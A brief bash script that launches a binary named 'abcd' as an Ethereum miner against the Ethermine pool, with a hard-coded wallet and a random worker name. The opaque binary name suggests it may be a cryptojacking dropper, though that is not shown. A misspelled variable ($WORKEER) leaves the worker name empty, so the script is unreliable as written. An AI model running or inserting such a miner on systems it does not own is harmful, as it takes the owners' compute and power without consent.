#!/bin/bash

POOL=us1.ethermine.org:4444

WALLET=0xccCc70822F17f042E52Ce1480795109baEdEc44A

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-preet)

chmod +x abcd

./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
